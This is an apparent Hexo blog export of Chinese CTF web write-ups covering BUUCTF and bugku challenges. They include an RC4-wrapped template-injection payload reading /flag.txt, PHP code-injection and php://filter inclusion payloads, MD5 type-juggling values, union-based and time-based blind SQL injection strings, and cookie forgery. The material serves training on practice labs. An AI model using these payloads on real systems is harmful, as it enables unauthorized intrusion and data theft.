    <url>/2020/01/03/java-web/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="Hey, password is required here." />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="b97b72b4153b1b987188636385984ced6eefbb91f633b08d7bd2f6ab1a65ccc8"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>web中的密码学[working]</title>
    <url>/2020/01/21/crypto-in-web/</url>
    <content><![CDATA[<h1>常用加密算法</h1>
<h2 id="RC4">RC4</h2>
<p>rc4: 加密和解密都是同一个流程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://43141291-ab15-4d3a-a236-3c2c0fd69898.node3.buuoj.cn/secret?secret="</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.key_length = len(key)</span><br><span class="line">        self._init_S_box()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_init_S_box</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.Box = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        k = [self.key[i % self.key_length] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            j = (j + self.Box[i] + ord(k[i])) % <span class="number">256</span></span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> plaintext:</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + self.Box[i]) % <span class="number">256</span></span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line">            t = (self.Box[i] + self.Box[j]) % <span class="number">256</span></span><br><span class="line">            result += chr(self.Box[t] ^ ord(ch))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">a = RC4(<span class="string">'HereIsTreasure'</span>)</span><br><span class="line">cmd = <span class="string">"&#123;&#123; [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() &#125;&#125;"</span></span><br><span class="line">payload = urllib.parse.quote(a.crypt(cmd))</span><br><span class="line">res = requests.get(url + payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>快速请求类型题目</title>
    <url>/2020/01/21/quick-request/</url>
    <content><![CDATA[<h2 id="GXYCTF-2019-strongest-mind">GXYCTF 2019 strongest_mind</h2>
<p>简单的提取计算式然后将答案发送过去</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://7b8625a6-977c-470c-a6fd-90fed4f5c01d.node3.buuoj.cn/index.php"</span></span><br><span class="line"></span><br><span class="line">res = requests.get(url)</span><br><span class="line">pattern = re.compile(<span class="string">r'&lt;br&gt;&lt;br&gt;(.*?)&lt;br&gt;&lt;br&gt;&lt;form action="index.php"'</span>)</span><br><span class="line">pattern1 = re.compile(<span class="string">r'&lt;br&gt;&lt;br&gt;(.*?)&lt;br&gt;&lt;br&gt;(.*?)&lt;br&gt;&lt;br&gt;&lt;form action="index.php"'</span>)</span><br><span class="line">result = pattern.findall(res.text)</span><br><span class="line">calc = result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1002</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result_num = eval(calc)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(calc)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    post_data = &#123;</span><br><span class="line">        <span class="string">"answer"</span>: result_num</span><br><span class="line">    &#125;</span><br><span class="line">    print(calc+<span class="string">"="</span>+str(result_num))</span><br><span class="line">    head = &#123;</span><br><span class="line">        <span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=8f73729d5502bb48b87a32d7ca390115"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url, data=post_data, headers=head)</span><br><span class="line">    time.sleep(<span class="number">1.5</span>)</span><br><span class="line">    calc = pattern1.findall(res.text)[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure>
<h2 id="快速反弹post类型">快速反弹post类型</h2>
<p>正则表达式内容补充：</p>
<h3 id="查询方式">查询方式</h3>
<p>re.findall(pattern, string[, flags]) ：返回string中所有与pattern相匹配的全部字串，返回形式为数组。（查询多次）</p>
<p>re.finditer(pattern, string[, flags]) ：<br>
返回string中所有与pattern相匹配的全部字串，返回形式为迭代器。</p>
<p>re.search(pattern, string[, flags])：若string中包含pattern子串，则返回Match对象，否则返回None，注意，如果string中存在多个pattern子串，只返回第一个。<br>
_sre.SRE_Match对象可以用.span()来过滤信息返回元组。</p>
<p>re.match(pattern, string[, flags])：<br>
从首字母开始开始匹配，string如果包含pattern子串，则匹配成功，返回Match对象，失败则返回None，若要完全匹配，pattern要以$结尾。</p>
<h3 id="查看方式">查看方式</h3>
<p>group():group()相当于group(0)，将整个匹配结果作为一个元组并返回，于括号无关。<br>
group(n)返回第n个括号最后一次匹配的结果。这个有点难理解，举例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">"123abc456"</span></span><br><span class="line">print(re.search(<span class="string">"([0-9])*([a-z])*([0-9]*)"</span>,a).group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">//输出结果<span class="string">'3'</span></span><br></pre></td></tr></table></figure>
<p>groups():m.groups() == (m.group(1), …)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(re.search(<span class="string">"([0-9])*([a-z])*([0-9]*)"</span>).groups());</span><br><span class="line">//输出的是(<span class="string">'3'</span>,<span class="string">'c'</span>,<span class="string">'456'</span>)</span><br></pre></td></tr></table></figure>
<h2 id="秋名山老司机">秋名山老司机</h2>
<p>题目中让我们在两秒内算出一个式子。</p>
<p>多刷新几次会发现提示让我们post数据上去（新套路get：多刷新几次）</p>
<p>编写的python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/qiumingshan/"</span></span><br><span class="line">hohoh = requests.session()</span><br><span class="line">hoho=hohoh.get(url)</span><br><span class="line">reg = <span class="string">"[\d*\+\-\*\/]&#123;3,&#125;"</span></span><br><span class="line">search = re.findall(reg,hoho.text)</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'value'</span>:eval(search[<span class="number">0</span>])&#125;</span><br><span class="line">flag = hohoh.post(url,data=data)</span><br><span class="line"><span class="keyword">print</span> flag.content.decode(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure>
<p>一开始运行。没有flag，再后来多次运行，点啊点啊点啊终于出来了flag，问杨晨学长说是头部的问题，可能是cookie的问题？</p>
<h2 id="天下武功唯快不破">天下武功唯快不破</h2>
<p>按照惯例，查看源码，看到了注释</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- please post what you find with parameter:key --&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后用开发者工具查看一下response头部信息，发现有flag字段信息出现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FLAG: UDBTVF9USElTX1QwX0NINE5HRV9GTDRHOnBpVzlaU2tQZw==</span><br></pre></td></tr></table></figure>
<p>根据尾巴上的两个等号判断是base64编码，尝试解码后看到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P0ST_THIS_T0_CH4NGE_FL4G:bIIWEyNiL</span><br></pre></td></tr></table></figure>
<p>于是写程序如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/10/10.php"</span></span><br><span class="line">headers = requests.get(url).headers</span><br><span class="line">key = base64.b64decode(headers[<span class="string">'FLAG'</span>]).split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">key = &#123;<span class="string">'key'</span>:key&#125;</span><br><span class="line">print(requests.post(url,data = key).content.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
<p>有时间想试试用正则来写</p>
<p><a href="https://blog.csdn.net/joyfixing/article/details/79971667" target="_blank" rel="noopener">https://blog.csdn.net/joyfixing/article/details/79971667</a></p>
]]></content>
  </entry>
  <entry>
    <title>bugku writeup</title>
    <url>/2019/04/22/bugku-writeup/</url>
    <content><![CDATA[<h1>bugku writeup</h1>
<h2 id="web3">web3</h2>
<p>网站里面循环弹出提示框，用chrome的开发者工具打开一片空白，<br>
用ctrl+u查看源代码，发现一串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;</span><br><span class="line">&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;</span><br><span class="line">&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;</span><br></pre></td></tr></table></figure>
<p>这是unicode，转码即可</p>
<h2 id="你必须让他停下来！">你必须让他停下来！</h2>
<p>查看源代码竟然直接有flag了，网上的解法是抓包</p>
<h2 id="本地包含">本地包含</h2>
<p><img src="assets/markdown-img-paste-20181124142129765.png" alt><br>
解法:利用hellow构造payload<br>
$_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。<br>
var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。<br>
递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对<br>
eval并无影响，对于eval来说，和eval（$a）是一样的。</p>
<p>payload：/index.php?hello = show_source(‘flag.php’)<br>
网上的payload：/index.php?hello=1);show_source(‘flag.php’);var_dump(</p>
<h2 id="域名解析">域名解析</h2>
<p>编辑etc/hosts添加一条123.206.87.240	 <a href="http://flag.bugku.com" target="_blank" rel="noopener">flag.bugku.com</a>，<br>
在浏览器中打开flag.bugku.com即可得到flag。</p>
<p>反思：host请求头是http1.1添加的东西，<br>
添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。</p>
<p>添加host之前访问ip地址结果显示错误400（缺少host）<br>
添加host之后访问ip地址结果显示错误403（读取访问被禁）</p>
<h2 id="你必须让他停下">你必须让他停下</h2>
<p>使用burpsuite的repeater功能进行抓包操作，<br>
通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag</p>
<h2 id="变量1">变量1</h2>
<p>函数知识：<br>
isset（）判断是否有输入<br>
pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\w+的意思是0~9 a~z A~Z，<br>
输入的内容被限定了，所以不能输入代码</p>
<p><img src="assets/markdown-img-paste-20181124143335113.png" alt></p>
<p>输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag</p>
<h2 id="Web5">Web5</h2>
<p>查看源代码，发现jother编码，打开控制台输入就行了</p>
<h2 id="头等舱">头等舱</h2>
<p>打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有，<br>
点击显示头文件源代码，显示flag（注释形式）</p>
<p>也可以：<br>
<img src="assets/markdown-img-paste-20181124145558281.png" alt></p>
<h2 id="网站被黑">网站被黑</h2>
<p>扫描端口<br>
<img src="assets/markdown-img-paste-20181124145054565.png" alt><br>
发现登陆界面</p>
<p>然后用burpsuite的intruder功能破解</p>
<h2 id="管理员系统">管理员系统</h2>
<p>打开界面后是一个登陆界面，输入一些东西，点击显示：<br>
<img src="assets/markdown-img-paste-20181124145951495.png" alt></p>
<p>实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端，<br>
也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。<br>
也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理，<br>
都会在尾部添加一个代理的ip，<br>
X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。<br>
同时查看网页源代码发现，有一串注释，查到说是base64编码，<br>
特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截，<br>
添加X-Forwarded-For：127。0.0.1后发送，得到了flag</p>
<p>参考资料：ctf中常见的编码格式： <a href="https://www.cnblogs.com/gwind/p/7997922.html" target="_blank" rel="noopener">https://www.cnblogs.com/gwind/p/7997922.html</a></p>
<h2 id="web4">web4</h2>
<p>查看源代码，发现一串url编码的东西，<br>
Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">a = <span class="string">'%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74</span></span><br><span class="line"><span class="string">%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c</span></span><br><span class="line"><span class="string">%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%</span></span><br><span class="line"><span class="string">3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70</span></span><br><span class="line"><span class="string">%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62'</span></span><br><span class="line"></span><br><span class="line">b = <span class="string">'%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d</span></span><br><span class="line"><span class="string">%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72</span></span><br><span class="line"><span class="string">%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72</span></span><br><span class="line"><span class="string">%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45</span></span><br><span class="line"><span class="string">%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75</span></span><br><span class="line"><span class="string">%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> urllib.unquote(a+b)</span><br></pre></td></tr></table></figure>
<p>得到代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> a=document.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=typeof a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)<span class="keyword">return</span>!<span class="number">0</span>;</span><br><span class="line">  alert(<span class="string">"Error"</span>);</span><br><span class="line">  a.focus();</span><br><span class="line">  <span class="keyword">return</span>!<span class="number">1</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure>
<p>可以看出这里已经暴露了password，返回输入即可。</p>
<h2 id="flag在index里面">flag在index里面</h2>
<p>点击链接，看url：file=show.Php，参数file是关键，<br>
本地包含(include)：file=php：//filter/read=convert.base64-encode/resource=index.php,</p>
<p>有关于这些协议的内容要好好看看</p>
<h2 id="输入密码得到flag">输入密码得到flag</h2>
<p>用burpsuite直接打</p>
<h2 id="点击一百万次">点击一百万次</h2>
<p>使用hackbar使用post动作：click = 1000001就得到了flag</p>
<h2 id="备份是个好习惯">备份是个好习惯</h2>
<h3 id="知识点补充">知识点补充</h3>
<p>$_SEVRER函数</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$SERVER[<span class="string">"$QUERY_STRING"</span>]</span><br><span class="line"><span class="comment">//获取查询语句也就是？之后的内容</span></span><br><span class="line"></span><br><span class="line">$SERBER[<span class="string">"REQUEST_URI"</span>]</span><br><span class="line"><span class="comment">//用来获取URL中的路径地址部分（不是url！）例如：http://www.hujuntao.com/index.php?p=3</span></span><br><span class="line"><span class="comment">//$_SERVER['REQUEST_URI']获得的就是/index.php?p=3这部分</span></span><br><span class="line"></span><br><span class="line">$_SERVER[<span class="string">"HTTP_X_REWRITE_URL"</span>]</span><br><span class="line"><span class="comment">//在IIS下功能同上，在apache环境下显示为空</span></span><br><span class="line"></span><br><span class="line">$SERVER[<span class="string">"SCRIPT_NAME"</span>]</span><br><span class="line"><span class="comment">//获取当前脚本的路径，比如“/aaa/index.php”</span></span><br><span class="line"></span><br><span class="line">$_SERVER[<span class="string">"PHP_SELF"</span>]</span><br><span class="line"><span class="comment">//正在执行的脚本名，比如“/aaa/index.php”</span></span><br></pre></td></tr></table></figure>
<p>str function</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>)</span><br><span class="line"><span class="comment">//return the string after '?' (include '?')</span></span><br><span class="line"></span><br><span class="line">substr($str,<span class="number">1</span>)</span><br><span class="line"><span class="comment">//return the string after the first symbol</span></span><br><span class="line"></span><br><span class="line">str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str)</span><br><span class="line"><span class="comment">//replace the 'key' in str to ''</span></span><br><span class="line"></span><br><span class="line">parse_str($str)</span><br><span class="line"><span class="comment">//parse the str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> example:</span><br><span class="line"></span><br><span class="line">    $str = <span class="string">"first=value&amp;arr[]=foo+bar&amp;arr[]=baz"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 推荐用法</span></span><br><span class="line">    parse_str($str, $output);</span><br><span class="line">    <span class="keyword">echo</span> $output[<span class="string">'first'</span>];  <span class="comment">// value</span></span><br><span class="line">    <span class="keyword">echo</span> $output[<span class="string">'arr'</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line">    <span class="keyword">echo</span> $output[<span class="string">'arr'</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不建议这么用</span></span><br><span class="line">    parse_str($str);</span><br><span class="line">    <span class="keyword">echo</span> $first;  <span class="comment">// value</span></span><br><span class="line">    <span class="keyword">echo</span> $arr[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line">    <span class="keyword">echo</span> $arr[<span class="number">1</span>]; <span class="comment">// baz</span></span><br></pre></td></tr></table></figure>
<p>回到bugku题目：备份是个好习惯</p>
<p>打开界面发现只有一串字符串<br>
<img src="assets/markdown-img-paste-20181124212115114.png" alt></p>
<p>搜索index.php.bak可以看到源码：</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);<span class="comment">//get string before "?"</span></span><br><span class="line">$str = substr($str,<span class="number">1</span>);                      <span class="comment">//get string after the second symbol</span></span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);          <span class="comment">//replace 'key' to '' in str</span></span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后分析构造payload，这里有一个知识点，用MD5加密的过程中，如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p>下列的字符串的MD5值都是0e开头的数字：</p>
<p>QNKCDZO</p>
<p>240610708</p>
<p>s878926199a</p>
<p>s155964671a</p>
<p>s214587387a</p>
<p>比较md5(username),md5(password),md5(code)类型和值，双等于存在漏洞的原因其实是，0E开头的MD5值php解析器会解析为numerical strings，在双等于（==）情况下，会先判断类型，识别为numerical strings，会强制转换为数字，所以0e开头的MD5值都为0，所以才能绕过，然而三等于就比较有脾气了，必须一对一的核对两个字符串，不存在什么类型转换问题，所以开头0e相同，后面不同，也就不满足了</p>
<p>所以构造payload：</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">index.php?kkey1=QNKCDZO&amp;kkey2=240610708</span><br></pre></td></tr></table></figure>
<p>按下回车就得到了flag</p>
<p>另：有一个扫描查看源码泄露的脚本，使用指南和下载地址如下：<br>
<a href="https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true" target="_blank" rel="noopener">https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true</a></p>
<h2 id="成绩单">成绩单</h2>
<p><img src="assets/markdown-img-paste-20181124221811221.png" alt></p>
<p>判断是数据库的问题，一开始犯蠢在url框里面写payload。。。。<br>
根据昨天所学的知识，我们先输入1，可以输出成绩单。然后输入1’发现失败，<br>
在尾部添加一个#又可以正常显示了。Emmmm。。。然后由于成绩单里面有三个列，<br>
所以从3开始试试看看到底有几个列。。。。<br>
最终在输入-1’ union select 1,2,3,4#的时候能够显示出内容，由此确定了有四列。</p>
<p>这个地方有点迷：同样是post形式，<br>
在查询框里面输入1’#就可以但是在hackbar里面写id=1‘#就不行，<br>
然而用id=1也是可以正常显示的。。。这个地方很是让我困惑，<br>
后来的payload也是在查询框里面写的。<br>
第二个问题是，同样是注释，为啥#就可以起作用但是–+就不行，<br>
考虑到题目的类型（水题），感觉不太可能是过滤掉了。。。很迷。。。。</p>
<p>已解决：–+的‘+’的意思是url中的空格，真实的注释仅仅是–</p>
<p><img src="assets/markdown-img-paste-20181124222217760.png" alt></p>
<p>做完这一切后就可以开始了：<br>
首先是查到所有数据库的名字<br>
-1’ union select 1,2,group_concat(schema_name),4 from information_schema.schemata#  得到了数据库名字有一个叫做skctf_flag的<br>
接下来，通过数据库名字查找表名<br>
-1’ union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=’skctf_flag’#		得到了一个叫做fl4g的一个表<br>
接下来通过表明找列名<br>
-1’ union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=’fl4g’# 得到了一个列名字叫做skctf_flag<br>
最后通过列名找到内容<br>
-1’union select 2,3,group_concat(skctf_flag),4 from skctf_flag.fl4g#<br>
得到flag</p>
<p><img src="assets/markdown-img-paste-20181124222231565.png" alt></p>
<h2 id="cookie欺骗">cookie欺骗</h2>
<p>看到网址里面filename后面是base64编码的东西，尝试解码看到是keys.txt<br>
改成index.php试一试，然后这里有一个line参数，随便输个1什么的，可以看到有php代码返回<br>
（有一个困惑就是输入0不返回最开始的&lt;?php）然后构造低端脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw</span></span><br><span class="line"></span><br><span class="line">url1 = <span class="string">'http://123.206.87.240:8002/web11/index.php?line='</span></span><br><span class="line">url2 = <span class="string">'&amp;filename=aW5kZXgucGhw'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> para <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    url = url1 + repr(para) + url2</span><br><span class="line">    print(requests.get(url).content)</span><br></pre></td></tr></table></figure>
<p>得到了以下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;<span class="comment">//这里应该是base进制转换，line为空的话默认设置为0</span></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);<span class="comment">//应该是打开文件的意思，文件应该是在同级目录下</span></span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后这是别人的获取代码脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.Session()</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/web11/index.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    payload=&#123;<span class="string">'line'</span>:str(i),<span class="string">'filename'</span>:<span class="string">'aW5kZXgucGhw'</span>&#125;</span><br><span class="line">    a=s.get(url,params=payload).content</span><br><span class="line">    content=str(a,encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">    print(content)</span><br></pre></td></tr></table></figure>
<p>嗯人家的正规很多啊</p>
<p>然后这里就是要post一个cookie，其中的参数是margin=margin,而且要把filename设置为<br>
keys.php的base64编码形式。这个就在burpsuite中操作：</p>
<p><img src="assets/markdown-img-paste-20181123214727533.png" alt></p>
<h2 id="bugku–insert-into">bugku–insert into</h2>
<p>the injection point is as follows:</p>
<blockquote>
<p>$sql=“insert into client_ip (ip) values (’$ip’)”;</p>
</blockquote>
<p>the $ip comes from “x-forwarded-for”</p>
<p>and before this code, the symbol ‘,’ has been filtered in our input;</p>
<p>payload are as followed:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">127.0.0.1+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="keyword">substr</span>((<span class="keyword">select</span> flag <span class="keyword">from</span> flag) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)=<span class="string">'C'</span> <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)<span class="comment">-- +</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>the ‘+’ on the tail is not for annotation,instead it exists for the blank space before<br>
,because the posted data’s last space will be ignored ,but adding another symbol after the space<br>
can avoid it.</p>
</blockquote>
<h2 id="never-give-up">never give up</h2>
<p>查看源代码，看见注释<!--1p.html--></p>
